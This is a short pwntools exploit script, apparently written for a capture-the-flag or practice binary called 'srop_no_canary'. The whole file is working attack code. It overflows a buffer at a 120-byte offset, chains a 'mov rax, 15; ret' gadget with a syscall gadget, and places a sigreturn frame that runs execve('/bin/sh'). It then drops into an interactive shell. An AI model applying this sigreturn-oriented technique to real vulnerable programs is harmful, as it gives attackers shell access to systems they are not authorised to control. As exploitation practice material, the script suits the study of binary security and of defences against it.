from pwn import *

# elf = ELF("./srop")
#libc_so = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
elf = context.binary = ELF("./srop_no_canary")
p = process()

# crashes with offset 120 in pwndbg (using cyclic -l string)
offset = 120
sys_execve_call = 59 #from system sall table for x86_64 arch
mov_rax_15_ret = pack(0x000000000040116c)
syscall = pack(0x000000000040115e)

frame = SigreturnFrame(kernel="amd64")
frame.rax = sys_execve_call
frame.rdi = 0x402004 #/bin/sh address
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x000000000040115e #can't use packed value

payload = cyclic(offset) + mov_rax_15_ret + syscall + bytes(frame)

# Sending Payload
p.sendline(payload)
p.interactive()